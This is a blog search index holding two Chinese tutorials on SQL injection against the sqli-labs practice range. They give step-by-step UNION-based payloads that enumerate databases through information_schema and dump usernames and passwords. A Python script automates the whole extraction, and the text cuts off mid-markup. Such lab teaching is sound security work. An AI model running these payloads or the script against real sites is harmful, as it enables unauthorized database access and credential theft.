<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入之MYSQL注入</title>
      <link href="/2023/03/01/31/"/>
      <url>/2023/03/01/31/</url>
      
        <content type="html"><![CDATA[<p>这篇文章是第一篇文章的扩展</p><p>第一篇文章：<a href="https://www.trtyr.top/2023/02/28/30/">SQL 注入之简要 SQL 注入</a></p><h2 id="一-MySQL-数据库注入"><a href="#一-MySQL-数据库注入" class="headerlink" title="一. MySQL 数据库注入"></a>一. MySQL 数据库注入</h2><h3 id="1-数据库概念"><a href="#1-数据库概念" class="headerlink" title="1. 数据库概念"></a>1. 数据库概念</h3><p>我们这里要说一个数据库的概念</p><p>数据库有很多种，比如现在常见的 MySQL，MongoDB 等数据库</p><p>我们第一篇文章用的就是 MySQL 数据库。</p><p>不过虽然数据库的种类繁多，但是他们的 SQL 语法是类似的，基本上没啥变化，因为如果一个数据库一个对应语法的话，它的学习成本就太高了，市面上这么多数据库，都学的话不知道要学到啥时候。</p><p>不过他们既然是不同的数据库，那么就会有一些自己特有的属性，这些我们之后会讲。</p><p>那么数据库是来干啥的？</p><p>我们在第一篇文章，通过对 URL 参数进行操作，来对数据库进行操作，从而让我们想要的数据出现在页面上。</p><p>所以数据库就是来放数据的一个地方。</p><p>我们这里要注意一个东西，这个数据是啥？是图片？是一个文件？还是一个表？还是其他的东西。</p><p>如果你看了这篇文章：<a href="https://www.trtyr.top/2023/02/16/15/">SQL 注入介绍与靶场实战 | Trtyr’s Blog</a>，你应该知道，<strong>我们这里的数据是一个一个表</strong>。</p><p>我们把图片，视频，字体等等这些文件，叫做<strong>媒体文件</strong>；而你的密码，你的博客文章内容，你的友链信息等等是<strong>以表单的形式</strong>储存。</p><p>比如：</p><div class="table-container"><table><thead><tr><th>name</th><th>username</th><th>password</th></tr></thead><tbody><tr><td>小明</td><td>A</td><td>123456</td></tr><tr><td>小红</td><td>123456</td><td>123456</td></tr><tr><td>李华</td><td>dakld</td><td>root</td></tr></tbody></table></div><p>就像这样的一个表，这是我们数据库中所说的数据</p><p>所以，<strong>数据库是一个来存放网站表单数据的地方</strong></p><h3 id="2-服务器，数据库，网站"><a href="#2-服务器，数据库，网站" class="headerlink" title="2. 服务器，数据库，网站"></a>2. 服务器，数据库，网站</h3><h4 id="1-它三儿之间的关系"><a href="#1-它三儿之间的关系" class="headerlink" title="(1) 它三儿之间的关系"></a>(1) 它三儿之间的关系</h4><p>数据库在哪？在服务器里头对吧</p><p>网站放在哪里？网站的媒体信息在服务器的网站文件夹里，网站的表单信息在数据库里头。</p><p>那么<strong>一个网站对应一个数据库</strong>，这个应该好理解，比如：</p><p>网站 A - 数据库 A</p><p>数据库 A 就存放网站 A 的表单。</p><p>之后就能理解数据库和表单里的关系了，<strong>数据库里一堆网站的表单</strong></p><p>然后我们想一想，一个服务器对应一个数据库吗？</p><p>如果有建站经验的小伙伴应该知道，我们买了一个云服务器后，可以在服务器里搭建多个网站，意味着可以搭建多个服务器，所以，<strong>一个服务器里可以有多个数据库和网站</strong></p><p>就是这样的：</p><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入1.webp" alt=""></p><p>如果我们对网站 A 进行操作的时候，是不会对其他两个网站造成影响。</p><h4 id="2-MySQL-的小特性"><a href="#2-MySQL-的小特性" class="headerlink" title="(2) MySQL 的小特性"></a>(2) MySQL 的小特性</h4><p>刚才讲了这么多，现在就是重点了。</p><p>MySQL 有一个神奇的东西，它自己带了一个数据库叫做’information_schema’，它里面有几个神奇的表，表里有神奇的字段，分别是:</p><ul><li>information_schema.SCHEMATA 中的 SCHEMA_NAME 字段:<br><strong>服务器内的，所有使用 MySQL 数据库的，数据库的名称</strong></li></ul><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入2.webp" alt=""></p><ul><li>information_schema.TABLES 中的 TABLE_NAME 字段:<br><strong>服务器内的，所有使用 MySQL 数据库的，表单的名称</strong></li></ul><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入3.webp" alt=""></p><ul><li>information_schema.TABLES 中的 TABLE_SCHEMA 字段:<br><strong>服务器内的，所有使用 MySQL 数据库的，表单对应的数据库名称</strong></li></ul><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入4.webp" alt=""></p><ul><li>information_schema.COLUMNS 中的 COLUMNS_NAME 字段:<br>**服务器内的，所有使用 MySQL 数据库的，表单内的字段名称</li></ul><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入5.webp" alt=""></p><ul><li>information_schema.COLUMNS 中的 TABLE_NAME 字段:<br>**服务器内的，所有使用 MySQL 数据库的，表单内的字段对应的表单名称</li></ul><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入6.webp" alt=""></p><ul><li>information_schema.COLUMNS 中的 TABLE_SCHEMA 字段:<br>**服务器内的，所有使用 MySQL 数据库的，表单内的字段对应表单对应的数据库库</li></ul><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入8.webp" alt=""></p><p>然后画图来说就是这样</p><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入9.webp" alt=""></p><h4 id="3-神奇的操作"><a href="#3-神奇的操作" class="headerlink" title="(3) 神奇的操作"></a>(3) 神奇的操作</h4><p>按照我们刚才的讲的：我有一个域名是’trtyr.top’，然后有一个服务器 A，然后里头有三个网站分别是’home.trtyr.top’，’web.trtyr.top’，’test.trtyr.top’，然后对应了三个 MySQL 数据库。</p><p>我们的目的是注入’web.trtyr.top’，但是我发现注入不了。但是，我发现了’home.trtyr.top’这个网站有注入点。</p><p>这里的重点是，在同一个服务器里头，而且用的是 MySQL 数据库，所以这个时候，我们就可以通过注入’home.trtyr.top’，借助 information_schema 这个数据库来间接得到’web.trtyr.top’。</p><p>这就是<strong>同一服务器的 MySQL 跨库攻击</strong>，不过这里还有一个权限的问题，下面会讲</p><h3 id="3-权限问题"><a href="#3-权限问题" class="headerlink" title="3. 权限问题"></a>3. 权限问题</h3><p>我们这里有一个权限的问题。</p><p>我们在 Linux 中有 root 用户和普通用户，在 Windows 中有管理员，用户，游客等用户权限，在 MySQL 中同理。</p><p>我们在 sql-libs 靶场中，注入看一下默认用户是啥</p><p>!()[\media\post\SQL 注入之 MYSQL 注入\SQL 注入之 MYSQL 注入 9.webp]</p><p>这里不会注入或者写脚本没关系，下面会讲</p><p>我们发现，它的用户是 ‘root@localhost’，也就以为这它目前是一个 root 用户，它有权限是查看其他的数据库。</p><p>我们上面讲了 MySQL 跨库攻击，这个尤其要注意用户权限，我们举的例子是通过注入’home.trtyr.top’来获取’web.trtyr.top’下的数据。</p><p>如果’home.trtyr.top’的用户是 root 用户的话，这种方法可行，如果它不是 root 用户，而是普通用户的话，这种方法就不好使了，因为你普通用户没有权限去看其他库的内容。</p><h2 id="二-基本的注入方式"><a href="#二-基本的注入方式" class="headerlink" title="二. 基本的注入方式"></a>二. 基本的注入方式</h2><h3 id="1-手工方式"><a href="#1-手工方式" class="headerlink" title="1. 手工方式"></a>1. 手工方式</h3><p>我们在这篇文章简单的讲一下基本的注入方式，我们把它称为<strong>联合注入</strong>。</p><p>联合注入，主要用的是 union select 的方式来进行注入的。</p><p>那么什么时候用联合注入呢？使用联合注入有两个条件，有回显，有回显位。</p><p>我们看 sql-libs 靶场的第一题</p><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入10.webp" alt=""></p><h4 id="1-找注入点"><a href="#1-找注入点" class="headerlink" title="(1) 找注入点"></a>(1) 找注入点</h4><p>首先，我们要找注入点。怎么找？一个一个试。我们在这篇文章也讲过<a href="https://www.trtyr.top/2023/02/28/30/">SQL 注入之简要 SQL 注入</a></p><p>我们试的时候应该先试最简单的，即字符型和数字型注入</p><p>我们发现，给 id 传参<code>1&#39; and 1=1 --+</code>的时候字面正常，<code>1&#39; and 1=2 --+</code>不报错但无显示。</p><p>所以注入类型为<strong>单引号字符串型注入</strong></p><h4 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="(2) 判断字段数"></a>(2) 判断字段数</h4><p>我们找到注入点后的第一件事就是判断字段数。用的是<code>order by</code>函数。</p><p>如果<code>order by n</code>回显正常，<code>order by n+1</code>出现报错，则字段数为 n</p><p>我们发现，id 传操<code>1&#39; order by 3 --+</code>正常而<code>1&#39; order by 4 --+</code>报错，说明字段数为 3</p><h4 id="3-构建-union-select-语句，得到回显位"><a href="#3-构建-union-select-语句，得到回显位" class="headerlink" title="(3) 构建 union select 语句，得到回显位"></a>(3) 构建 union select 语句，得到回显位</h4><p>因为字段数为 3，所以，我们的语句应该是<code>union select 1,2,3</code>.</p><p>如果字段数为 4，那么语句应该是<code>union select 1,2,3,4</code>，字段数为 5，那么语句应该是<code>union select 1,2,3,4,5</code></p><p>我们这里是 3 字段，传参<code>-1&#39; union select 1,2,3 --+</code></p><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入11.webp" alt=""></p><p>发现 2 和 3 有回显。</p><p>这里注意一下，我们传的是<code>-1&#39; union select 1,2,3 --+</code>而不是<code>1&#39; union select 1,2,3 --+</code>，差在 1 和 -1 上</p><p>我们的目的是暴漏回显位，让回显位显示我们自己设定的内容，即 1,2,3，如果是 1 的话，内容正常，显示的还是正常的内容。</p><h4 id="4-替换回显位的数字，得到信息"><a href="#4-替换回显位的数字，得到信息" class="headerlink" title="(4) 替换回显位的数字，得到信息"></a>(4) 替换回显位的数字，得到信息</h4><p>我们这里要先知道一些特殊的函数，比如 database()可以显示数据库名称，version()可以显示服务器版本等等</p><p>我们得到了两个回显位，2 和 3，我们可以把他们替换成特殊的函数，比如我们把 2 替换掉。</p><p>向 id 传参<code>-1&#39; union select 1,database(),3 --+</code></p><p><img src="\\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入12.webp" alt=""></p><p>这样就得到了数据库的名称，其他的同理，只需要替换 database()为其他函数即可</p><h4 id="5-获取表名"><a href="#5-获取表名" class="headerlink" title="(5) 获取表名"></a>(5) 获取表名</h4><p>我们已经得到了数据库名称为’security’</p><p>我们可以通过 information_schema 这个数据库来获得信息</p><p>首先是数据库下的表名。</p><p>我们想要一次性的输出所有的表名，需要用到 group_concat()函数</p><p>这里由于会稍微复杂，我们先要理清逻辑在写。</p><p>我们的要的是 information_schema.tables 中的 table_name 字段，就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,table_name,3 from information_schema.tables</span><br></pre></td></tr></table></figure><p>这个 tables 字段有一堆，我们想要一次性的输出所有的表名，就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables</span><br></pre></td></tr></table></figure><p>我们这样是得到了 information_schema.tables 内的所有 tables 字段的内容，但是这个是服务器内所有数据库的表名，我们想要当前数据库的，也就是 security 数据库的，就需要用 where 来进行限制，然后当前表里有一个 table_schema 字段是代表数据库，然后就是这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><p>所以我们可以向 id 传参：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="\\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入13.webp" alt=""></p><p>这样就得到了所有的表名</p><h4 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="(6) 获取表中的字段名"></a>(6) 获取表中的字段名</h4><p>我们已经知道了表名，数据库名，我们现在想要得到 users 表下的字段名字</p><p>获取字段名字用的是 information_schema.columns 下的 column_name 字段。</p><p>直接把上面的代码替换即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p>然后还有一个问题，我们现在的筛选条件是 security 数据库下的字段数，我们还得筛选表名。</p><p>所以最终是这样的，向 id 传参：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入14.webp" alt=""></p><h4 id="7-获取字段数据"><a href="#7-获取字段数据" class="headerlink" title="(7)获取字段数据"></a>(7)获取字段数据</h4><p>我们要获取 username 和 password 两个字段下的数据。</p><p>我们现在知道了字段名，数据库名，表名，直接上就行了。</p><p>向 id 传参：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(username),3 from users --+</span><br><span class="line">-1&#x27; union select 1,group_concat(password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入15.webp" alt=""></p><p>password 的结果就不放了，都差不多。</p><h3 id="2-脚本注入"><a href="#2-脚本注入" class="headerlink" title="2. 脚本注入"></a>2. 脚本注入</h3><p>我这个是拿 Python 写的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://localhost/sql-libs/Less-1/?id=&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取字段数</span><br><span class="line">def get_number_field():</span><br><span class="line">    print(&quot;=&quot; * 60)</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        parameter = f&quot;1&#x27; order by &#123;i&#125; --+&quot;  # order by 参数</span><br><span class="line">        url_ = url + parameter</span><br><span class="line">        response = requests.get(url_)</span><br><span class="line">        response.encoding = &quot;utf8&quot;</span><br><span class="line"></span><br><span class="line">        if &quot;name&quot; not in response.text:</span><br><span class="line">            print(f&quot;当前表字段数为&#123;i - 1&#125;&quot;)</span><br><span class="line">            global order_by</span><br><span class="line">            order_by = i - 1</span><br><span class="line">            break</span><br><span class="line">        else:            pass</span><br><span class="line"></span><br><span class="line"># 构建union select的URL</span><br><span class="line">def build_url():</span><br><span class="line">    print(&quot;=&quot; * 60)</span><br><span class="line">    global number_list</span><br><span class="line">    number_list = []</span><br><span class="line">    for i in range(1, order_by + 1):</span><br><span class="line">        number_list.append(i)</span><br><span class="line"></span><br><span class="line">    parameter = f&quot;-1&#x27; union select &#123;str(number_list).strip(&#x27;[&#x27;).strip(&#x27;]&#x27;)&#125; --+&quot;    url_ = url + parameter</span><br><span class="line">    response = requests.get(url_)</span><br><span class="line">    response.encoding = &quot;utf8&quot;</span><br><span class="line"></span><br><span class="line">    if &quot;You&quot; in response.text:</span><br><span class="line">        print(f&quot;请访问URL以得到回显点：&#123;url_&#125;&quot;)</span><br><span class="line">    else:        print(&quot;sorry,出问题了&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取基础数据</span><br><span class="line">list_ = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_information_simple():</span><br><span class="line">    print(&quot;=&quot; * 60)</span><br><span class="line">    count = 1</span><br><span class="line"></span><br><span class="line">    list_1 = list(number_list)</span><br><span class="line">    list_a = [&quot;database()&quot;, &quot;version()&quot;, &quot;user()&quot;, &quot;@@datadir&quot;, &quot;@@basedir&quot;, &quot;@@version_compile_os&quot;]</span><br><span class="line">    list_b = [&quot;数据库名称&quot;, &quot;服务器版本&quot;, &quot;登录数据库的用户&quot;, &quot;数据的路径&quot;, &quot;数据库的安装路径&quot;, &quot;系统版本&quot;]</span><br><span class="line">    number = int(input(&quot;请输入想要更改的回显位上显示的数字: &quot;)) - 1</span><br><span class="line">    global re_txt</span><br><span class="line">    re_txt = input(&quot;请输入re正则&quot;)  # &gt;Your Login name:(.*?)&lt;</span><br><span class="line"></span><br><span class="line">    for i in range(0, len(list_a)):</span><br><span class="line">        list_1[number] = list_a[i]</span><br><span class="line">        list_change = (str(list_1).strip(&#x27;[&#x27;).strip(&#x27;]&#x27;)).replace(&quot;&#x27;&quot;, &quot;&quot;)</span><br><span class="line">        parameter = f&quot;-1&#x27; union select &#123;str(list_change)&#125; --+&quot;</span><br><span class="line">        url_ = url + parameter</span><br><span class="line">        response = requests.get(url_)</span><br><span class="line">        response.encoding = &quot;utf8&quot;</span><br><span class="line"></span><br><span class="line">        for ii in re.findall(re_txt, response.text):</span><br><span class="line">            print(f&quot;&#123;list_b[i]&#125;:&#123;ii&#125;&quot;)</span><br><span class="line">            if count == 1:</span><br><span class="line">                list_.append(&#123;ii&#125;)</span><br><span class="line"></span><br><span class="line">                count += 1</span><br><span class="line">            else:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"># 获取表单数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_tables():</span><br><span class="line">    print(&quot;=&quot; * 60)</span><br><span class="line">    database = 0</span><br><span class="line"></span><br><span class="line">    for i in list_[0]:</span><br><span class="line">        database = i</span><br><span class="line"></span><br><span class="line">    count = 1</span><br><span class="line"></span><br><span class="line">    list_a = [&quot;table_name&quot;, &quot;column_name&quot;]</span><br><span class="line"></span><br><span class="line">    list_b = [&quot;tables&quot;, &quot;columns&quot;]</span><br><span class="line"></span><br><span class="line">    for i in range(len(list_a)):</span><br><span class="line">        list_1 = list(number_list)</span><br><span class="line">        list_1[1] = f&quot;group_concat(&#123;list_a[i]&#125;)&quot;</span><br><span class="line">        list_change = (str(list_1).strip(&#x27;[&#x27;).strip(&#x27;]&#x27;)).replace(&quot;&#x27;&quot;, &quot;&quot;)</span><br><span class="line">        if count == 1:</span><br><span class="line"></span><br><span class="line">            parameter = f&quot;-1&#x27; union select &#123;str(list_change)&#125; from information_schema.&#123;list_b[i]&#125; where table_schema = &#x27;&#123;database&#125;&#x27; --+&quot;</span><br><span class="line">            url_ = url + parameter</span><br><span class="line">            response = requests.get(url_)</span><br><span class="line">            response.encoding = &quot;utf8&quot;</span><br><span class="line">            for ii in re.findall(re_txt, response.text):</span><br><span class="line">                print(f&quot;表有：&#123;ii&#125;&quot;)</span><br><span class="line">                count += 1</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            global choose_table</span><br><span class="line">            choose_table = input(&quot;请选择一张表：&quot;)</span><br><span class="line">            parameter = f&quot;-1&#x27; union select &#123;str(list_change)&#125; from information_schema.&#123;list_b[i]&#125; where table_schema = &#x27;&#123;database&#125;&#x27; and table_name = &#x27;&#123;choose_table&#125;&#x27; --+&quot;</span><br><span class="line">            url_ = url + parameter</span><br><span class="line">            response = requests.get(url_)</span><br><span class="line">            response.encoding = &quot;utf8&quot;</span><br><span class="line">            for ii in re.findall(re_txt, response.text):</span><br><span class="line">                print(f&quot;&#123;choose_table&#125;有这些字段：&#123;ii&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_information():</span><br><span class="line">    print(&quot;=&quot; * 60)</span><br><span class="line">    choose_column_name = input(&quot;请输入想要查询的字段：&quot;)</span><br><span class="line">    list_1 = list(number_list)</span><br><span class="line">    list_1[1] = f&quot;group_concat(&#123;choose_column_name&#125;)&quot;</span><br><span class="line">    list_change = (str(list_1).strip(&#x27;[&#x27;).strip(&#x27;]&#x27;)).replace(&quot;&#x27;&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">    parameter = f&quot;-1&#x27; union select &#123;list_change&#125; from &#123;choose_table&#125; --+&quot;    url_ = url + parameter</span><br><span class="line">    print(url_)</span><br><span class="line">    response = requests.get(url_)</span><br><span class="line">    response.encoding = &quot;utf8&quot;</span><br><span class="line">    for i in re.findall(re_txt, response.text):</span><br><span class="line">        print(f&quot;&#123;choose_column_name&#125;字段数据为：&#123;i&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    get_number_field()</span><br><span class="line">    build_url()</span><br><span class="line">    get_information_simple()</span><br><span class="line">    get_tables()</span><br><span class="line">    get_information()</span><br></pre></td></tr></table></figure><p>这是演示截图：</p><p><img src="\media\post\SQL注入之MYSQL注入\SQL注入之MYSQL注入16.webp" alt=""></p><p>之后的使用，只需要把注入方式变一下就行了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之简要SQL注入</title>
      <link href="/2023/02/28/30/"/>
      <url>/2023/02/28/30/</url>
      
        <content type="html"><![CDATA[<p>请先看：</p><p><a href="https://www.trtyr.top/2023/02/16/15/">SQL注入介绍与靶场实战 | Trtyr’s Blog</a></p><p>先把这篇文章看了，主要是了解一下SQL语法，还有一些特殊库的用法</p><h2 id="一-SQL注入"><a href="#一-SQL注入" class="headerlink" title="一. SQL注入"></a>一. SQL注入</h2><h3 id="1-SQL注入的危害"><a href="#1-SQL注入的危害" class="headerlink" title="1. SQL注入的危害"></a>1. SQL注入的危害</h3><p>这个危害主要是分为两块。</p><p>大部分的SQL注入都是对数据库里的内容进行操作，包括一些查询，更新和删除等等，即数据库的内容会被SQL注入所影响到，SQL注入能够操作数据，凡是和数据相关的目的，可以用SQL注入来进行操作。</p><p>还有一种，SQL注入可以注入一些木马后门，就是常说的get web shell，获取权限，但是这种直接获取权限的情况是分条件的，也就是注入点的权限不同</p><h3 id="2-SQL注入产生的原理"><a href="#2-SQL注入产生的原理" class="headerlink" title="2. SQL注入产生的原理"></a>2. SQL注入产生的原理</h3><h4 id="1-源码简单分析"><a href="#1-源码简单分析" class="headerlink" title="(1) 源码简单分析"></a>(1) 源码简单分析</h4><p>我们拿一个代码来看看，这里用的是SQL-libs靶场的第二题源码做演示</p><p><img src="\media\post\SQL注入之简要SQL注入\SQL注入之简要SQL注入1.webp" alt=""></p><p>可以看到这是一个PHP写的一个网页，你们不用知道这是啥意思，能简单看懂就行了。</p><p>我们看看</p><p><img src="\media\post\SQL注入之简要SQL注入\SQL注入之简要SQL注入2.webp" alt=""></p><p>这里的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))  // 这玩意就是参数，意味着网站后面要加上id参数</span><br><span class="line">&#123;  </span><br><span class="line">$id=$_GET[&#x27;id&#x27;];  // 这里是用一个叫id的变量，来接收参数。</span><br></pre></td></tr></table></figure><p>往下看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>这就是要执行的SQL语句</p><p>我们来看看网站</p><p><img src="\media\post\SQL注入之简要SQL注入\SQL注入之简要SQL注入3.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql-libs/Less-2/?id=1</span><br></pre></td></tr></table></figure><p>可以看到我们后门加了’?id=1’，这就是加上了id参数，值为1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:Dumb  </span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure><p>这个就是通过SQL语句得到的数据库里的内容</p><p>我们为了学习方便，我们可以用echo来输出SQL语句</p><p>echo的作用就是来输出语句的，比如’echo 1’就是输出1，’echo 5’就是输出5</p><p>我们想要输出sql变量，就是”echo $sql”</p><p><img src="\media\post\SQL注入之简要SQL注入\SQL注入之简要SQL注入4.webp" alt=""></p><p>我们刷新一下网页。</p><p><img src="\media\post\SQL注入之简要SQL注入\SQL注入之简要SQL注入5.webp" alt=""></p><p>可以看到SQL语句就被输出了。</p><h4 id="2-SQL注入的产生原因-简单理解"><a href="#2-SQL注入的产生原因-简单理解" class="headerlink" title="(2) SQL注入的产生原因 - 简单理解"></a>(2) SQL注入的产生原因 - 简单理解</h4><p>那么SQL注入产生的原因是啥呢？</p><p>我们刚才看到了源码里有一个SQL语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=$id LIMIT 0,1</span><br></pre></td></tr></table></figure><p>这个意思是从users表里查看id=？的数据，当id=1就看1的数据，2同理。</p><p>这里的id等于几是我们可以自行输入，那如果我们输入一些奇怪的东西呢？</p><p>比如我们输入 ‘-1 union select 1,2,3 —+’</p><p>这时SQL语句就变成了这样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=-1 union select 1,2,3 --+LIMIT 0,1</span><br></pre></td></tr></table></figure><p>‘—‘后面被注释掉，这句话就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><p>这样就能得到回显位</p><p><img src="\media\post\SQL注入之简要SQL注入\SQL注入之简要SQL注入6.webp" alt=""></p><p>这就是SQL注入的简单原理。</p><h4 id="3-SQL注入的产生原理"><a href="#3-SQL注入的产生原理" class="headerlink" title="(3) SQL注入的产生原理"></a>(3) SQL注入的产生原理</h4><p>我们观察源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=$id LIMIT 0,1</span><br></pre></td></tr></table></figure><p>这里的重点时啥？是这个$id，也就是这个变量。</p><p>如果我们这个SQL语句是这样写的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 LIMIT 0,1</span><br></pre></td></tr></table></figure><p>这样的话，页面就会一直显示id=1的内容，也就是说，你无法更改，这样就不能进行注入</p><p>或者这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 